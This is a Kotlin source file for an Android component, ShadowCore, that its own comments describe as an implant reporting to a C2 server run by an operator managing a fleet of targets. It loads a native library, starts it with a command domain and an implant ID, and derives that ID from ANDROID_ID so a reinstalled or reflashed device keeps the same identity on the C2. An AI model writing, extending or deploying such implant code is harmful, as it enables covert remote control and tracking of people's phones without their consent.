package com.shadow

import android.content.Context
import android.util.Log
import java.util.UUID

object ShadowCore {
    private const val TAG = "ShadowCore"
    
    init {
        try {
            System.loadLibrary("shadow")
        } catch (e: Throwable) {
            // UnsatisfiedLinkError is an Error, not Exception — must not kill the process
            Log.e(TAG, "Failed to load libshadow.so", e)
        }
    }

    // Native functions — keep externals private; public wrappers never throw
    private external fun nativeInit(domain: String, implantId: String): Int
    private external fun nativeLogEvent(entry: String)

    fun logEvent(entry: String) {
        try {
            nativeLogEvent(entry)
        } catch (e: Throwable) {
            Log.e(TAG, "logEvent unavailable", e)
        }
    }

    fun start(context: Context, domain: String) {
        // Retrieve the implant ID.
        //
        // A random UUID stored in SharedPreferences is regenerated by every
        // reinstall, which silently orphans the operator: the C2 keeps answering the
        // old ID, the app now has a new one, and the fleet reads DEAD. ANDROID_ID is
        // stable across uninstall/reinstall for a given signing key (and the release
        // keystore is pinned in CI), so deriving the ID from it keeps a reflashed
        // target under the same identity. An explicit override still wins, for lab
        // boxes hosting several identities.
        val prefs = context.getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
        val implantId = prefs.getString("implant_id", null)?.takeIf { it.isNotBlank() }
            ?: stableIdFor(context).also { prefs.edit().putString("implant_id", it).apply() }

        Log.i(TAG, "Starting ShadowCore... ID: $implantId")
        try {
            val res = nativeInit(domain, implantId)
            if (res != 0) {
                Log.e(TAG, "nativeInit failed with code $res")
            }
        } catch (e: Throwable) {
            Log.e(TAG, "nativeInit unavailable (native lib missing?)", e)
        }
    }

    /**
     * Deterministic UUID for this device+signing key. nameUUIDFromBytes is MD5-based
     * (a v3 UUID) and needs no permission, no network and no storage, so a fresh
     * install lands on the same identity the C2 already knows.
     */
    private fun stableIdFor(context: Context): String {
        val seed = try {
            android.provider.Settings.Secure.getString(
                context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
            )
        } catch (e: Throwable) {
            null
        }
        // ANDROID_ID has been null/"unknown" on some OEM images; fall back to a
        // random id rather than collide every device onto one shared identity.
        if (seed.isNullOrBlank() || seed == "unknown") {
            return UUID.randomUUID().toString()
        }
        return UUID.nameUUIDFromBytes(("shadow1:" + seed + ":" + context.packageName).toByteArray())
            .toString()
    }
}
